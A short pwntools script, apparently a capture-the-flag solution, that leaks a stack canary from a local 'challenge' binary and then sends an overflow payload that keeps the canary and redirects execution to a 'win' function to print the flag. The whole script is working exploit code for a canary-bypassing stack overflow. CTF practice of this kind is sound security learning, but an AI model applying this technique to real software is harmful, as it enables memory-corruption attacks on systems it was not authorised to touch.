from pwn import *

# set exploit source, context binary, context log_level, libc
elf = context.binary = ELF("./challenge", checksec=False)
# context.log_level = 'debug'
# libc = ELF("./glibc/libc.so.6")

# Run binary 1st time
p = process("./challenge")

win = 0x40128e

p.sendlineafter(b"Option: ", b"1")
p.sendlineafter(b"say?\n", b"a"*32)
p.recvuntil(b"canary!\n")
canary = int(p.recvline().strip(), 16)
print(f"{hex(canary) = }")

p.sendlineafter(b"Option: ", b"3")

payload = flat({0x10: p64(0)+p64(canary)+p64(0)+p64(win)})
p.sendlineafter(b"poison:\n", payload)
p.recvuntil(b"flag{")
print(b"flag{"+p.recvall())